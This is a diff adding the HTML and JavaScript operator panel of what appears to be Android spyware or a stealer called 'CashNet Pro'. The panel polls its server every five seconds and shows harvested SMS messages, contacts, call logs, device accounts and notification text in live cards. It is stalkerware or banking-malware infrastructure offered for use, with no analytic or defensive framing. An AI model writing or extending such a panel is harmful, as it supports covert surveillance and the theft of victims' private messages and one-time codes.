@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CashNet Pro Panel</title>
+<style>
+body{font-family:monospace;background:#0b0b0b;color:#e0e0e0;margin:0;padding:20px}
+h1{color:#22c55e;margin:0 0 20px}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.card{background:#161616;border:1px solid #2a2a2a;border-radius:8px;padding:14px;max-height:400px;overflow-y:auto}
+.card h3{margin:0 0 8px;color:#22c55e;font-size:14px}
+.item{border-bottom:1px solid #222;padding:6px 0;font-size:12px;word-break:break-all}
+.item small{color:#777;display:block}
+#status{position:fixed;top:10px;right:10px;background:#161616;padding:6px 10px;border-radius:4px;font-size:12px;color:#22c55e}
+</style>
+</head>
+<body>
+<h1>CashNet Pro</h1>
+<div id="status">● LIVE</div>
+<div class="grid">
+  <div class="card"><h3>// SMS</h3><div id="sms"></div></div>
+  <div class="card"><h3>// CONTACTS</h3><div id="contacts"></div></div>
+  <div class="card"><h3>// CALLS</h3><div id="calls"></div></div>
+  <div class="card"><h3>// ACCOUNTS</h3><div id="accounts"></div></div>
+  <div class="card" style="grid-column:span 2"><h3>// NOTIFICATIONS</h3><div id="notifs"></div></div>
+</div>
+<script>
+const B = location.origin;
+const r = (id, arr, f) => {
+  const el = document.getElementById(id);
+  el.innerHTML = (!arr||!arr.length) ? "<div class='item'><small>empty</small></div>" : arr.map(i=>`<div class="item">${f(i)}</div>`).join("");
+};
+async function pull(){
+  try{
+    const [s,c,l,a,n] = await Promise.all([
+      fetch(B+"/api/sms").then(r=>r.json()),
+      fetch(B+"/api/contacts").then(r=>r.json()),
+      fetch(B+"/api/calls").then(r=>r.json()),
+      fetch(B+"/api/accounts").then(r=>r.json()),
+      fetch(B+"/api/notifications").then(r=>r.json())
+    ]);
+    r("sms",s.sms,i=>`<small>${i.address}</small>${i.body}`);
+    r("contacts",c.contacts,i=>`<small>${i.name}</small>${i.number}`);
+    r("calls",l.calls,i=>`<small>${i.type} · ${i.duration}s</small>${i.number}`);
+    r("accounts",a.accounts,i=>`<small>${i.type}</small>${i.name}`);
+    r("notifs",n.notifications,i=>`<small>${i.package}</small>${i.title}: ${i.text}`);
+  }catch(e){console.error(e)}
+}
+pull(); setInterval(pull, 5000);
+</script>
+</body>
+</html>
